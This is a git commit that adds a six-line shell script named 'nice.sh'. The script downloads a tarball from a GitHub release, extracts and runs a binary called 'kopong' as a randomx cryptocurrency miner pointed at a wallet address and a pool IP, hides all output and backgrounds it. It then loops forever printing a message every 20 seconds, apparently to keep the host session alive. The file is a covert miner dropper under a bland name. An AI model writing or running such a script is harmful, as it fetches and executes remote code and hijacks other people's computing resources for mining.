252bcc86624b7d19a3b32afcbe2242acafc73212
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-12 04:23:40 +0700

    Create nice.sh

---
+++ nice.sh
@@ -0,0 +1,6 @@
+wget https://github.com/preak07/kopi/releases/download/susu/kopong.tar.gz && tar -xvf kopong.tar.gz &&  chmod +x kopong && ./kopong -algo randomx -wallet 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f  -coin BTC -rigName "vivo" -pool1 34.96.85.230:3380 -threads= 1 >/dev/null 2>&1 &
+while true
+do
+        echo "gasss........!"
+        sleep 20
+done
